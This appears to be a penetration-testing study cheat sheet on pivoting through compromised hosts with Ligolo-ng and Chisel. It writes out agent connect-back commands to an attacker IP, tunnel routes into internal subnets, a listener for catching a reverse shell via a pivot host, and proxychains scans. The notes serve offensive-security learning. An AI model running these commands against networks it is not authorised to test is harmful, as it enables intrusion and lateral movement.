## References

- [Ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng)
    
- [Chisel GitHub](https://github.com/jpillora/chisel)
    
- [System Weakness: Pivoting with Ligolo-ng & Chisel](https://systemweakness.com/everything-about-pivoting-oscp-active-directory-lateral-movement-6ed34faa08a2)

---

| Tool | Best for | Agent required on target |
|---|---|---|
| Ligolo-ng | Full network pivot with routing table | Yes (agent binary) |
| Chisel | Single port forward, quick setup | Yes (chisel binary) |
| SSH `-L` / `-R` | When SSH is available | No |
| `socat` | Simple one-shot relay | Yes (socat binary) |
| `sshuttle` | Full VPN over SSH from attacker machine | No (attacker-side only) |

!!! tip "Tip"
    Ligolo-ng is the fastest way to pivot to an internal network — once the agent connects back, add a route on your attacker machine and the entire subnet is accessible. No need for individual port forwards.

## Ligolo-ng

### Setting Up Ligolo-ng

#### 1. Download & Extract Ligolo-ng Binaries

Download binaries for both attacker (Kali VM) and target (Windows/Linux host) from [Ligolo-ng Releases](https://github.com/nicocha30/ligolo-ng/releases).

```bash
tar -xzvf ligolo-ng_agent_VERSION_HARDWARE.tar.gz  
tar -xzvf ligolo-ng_proxy_VERSION_HARDWARE.tar.gz
```

#### 2. Configure Ligolo-ng Network

Create a TUN interface and bring it up:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

#### 3. Start the Proxy on Kali

Run the proxy to listen for incoming agent connections:

```bash
./proxy -laddr 0.0.0.0:9001 -selfcert
```

#### 4. Start the Agent on the Compromised Target

Upload the agent binary to the target and execute it:

```bash
.\agent.exe -connect 192.168.45.249:9001 -ignore-cert
```

#### 5. Establish the Tunnel

Once the agent connects, Ligolo-ng will display:

```
INFO[0061] Agent joined.
```

Select the session:

```bash
ligolo-ng >> session
```

(Optional) Verify internal subnet visibility:

```bash
ligolo-ng >> ifconfig
```

Start the session:

```bash
ligolo-ng >> start
```

#### 6. Add Route to Internal Network

Now, route internal traffic through the tunnel:

```bash
sudo ip route add 172.16.4.0/24 dev ligolo
```

This allows access to internal hosts behind the compromised target.

### Adding Listeners

Once Ligolo-ng is configured on the attacking machine and target, you may need to configure a listener to reach the attacking machine from internal PCs. 

```bash
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
```
#### Example Scenario
MS01: 192.168.149.150
MS02: 10.10.110.45
DC01: 10.10.110.44

You've deployed Ligolo-ng onto MS01 (agent) and are running the proxy from your kali VM. After you've gained initial access to MS01, you notice an MSSQL server on an nmap scan for MS02. You can connect to the MSSQL server from the kali VM, however, to execute shell code, you **must** use MS01 as your connecting IP, not the tun0 address in kali VM. To do this, setup a listener on the port you choose for the shell code which will allow you to catch the shell using netcat from kali.

---
## Chisel

Chisel is a fast TCP/UDP tunnel that supports SOCKS5 proxying and reverse port forwarding, making it useful for pivoting in restricted environments.

### Setting Up Chisel

#### 1. Download & Extract Chisel

Download the latest release from [Chisel Releases](https://github.com/jpillora/chisel/releases).

Extract the binary:

```bash
gunzip chisel_linux_amd64.gz
chmod +x chisel_linux_amd64
```

#### 2. Start Chisel Server on Kali

Run the Chisel server in reverse mode:

```bash
chisel server -p 8080 --reverse
```

#### 3. Start Chisel Client on the Target

Upload the chisel client to the compromised host and establish a reverse tunnel:

```bash
.\chisel.exe client 192.168.45.249:8080 R:3306:127.0.0.1:3306
```

This forwards MySQL port 3306 from the internal target to Kali.

#### 4. Access the Forwarded Service

On Kali, connect to the internal MySQL service:

```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```

### Chisel SOCKS5 Proxying

To use Chisel as a SOCKS proxy, start the client with `-socks5`:

```bash
.\chisel.exe client 192.168.45.249:8080 R:socks
```

Configure `proxychains`:

```
socks5 127.0.0.1 1080
```

Run network enumeration through the tunnel:

```bash
proxychains nmap -sT -p445 10.4.50.215
proxychains smbclient -L //10.4.50.215/ -U user
```

This routes all traffic through the compromised host.

---
## Summary

- Ligolo-ng is ideal for full network tunneling with encrypted mutual TLS.
    
- Chisel is lightweight and supports SOCKS proxying, dynamic port forwarding, and reverse tunnels.
    
- Both tools enable attackers to bypass firewalls, pivot through networks, and access restricted services.
    

These tunneling techniques are crucial for maintaining persistence, lateral movement, and internal network access.